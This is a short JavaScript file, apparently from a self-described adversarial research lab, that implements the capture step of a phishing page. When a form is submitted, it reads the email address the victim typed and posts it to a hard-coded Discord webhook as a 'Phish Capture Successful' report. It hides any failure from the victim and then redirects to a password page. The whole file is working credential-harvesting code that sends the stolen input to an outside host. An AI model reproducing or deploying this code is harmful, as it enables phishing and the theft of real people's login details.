// ENI-Lab: capture_logic.js
// Reference: QUICK_REFERENCE_100.txt - ASR & Encoding Patterns

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";

async function handleNext(event) {
    // 1. Prevent form submission/refresh
    if(event) event.preventDefault(); 
    
    // 2. Extract the payload
    const emailValue = document.getElementById('email-input').value;

    // 3. Craft the report (Formatting for readability in Discord)
    const payload = {
        embeds: [{
            title: "🎯 Phish Capture Successful",
            color: 15158332, // Red
            fields: [
                { name: "Target Input", value: `\`${emailValue}\`` },
                { name: "Tier Level", value: "TIER 2: Apprentice" },
                { name: "Method", value: "Direct Input Interception" }
            ],
            footer: { text: "ENI-Tutor | Adversarial Research Lab" }
        }]
    };

    try {
        // 4. Transmission
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (err) {
        // Fail silently in the UI, log for the student/developer
        console.error("Link failure:", err);
    }

    // 5. Redirection
    window.location.href = "password.html"; 
}
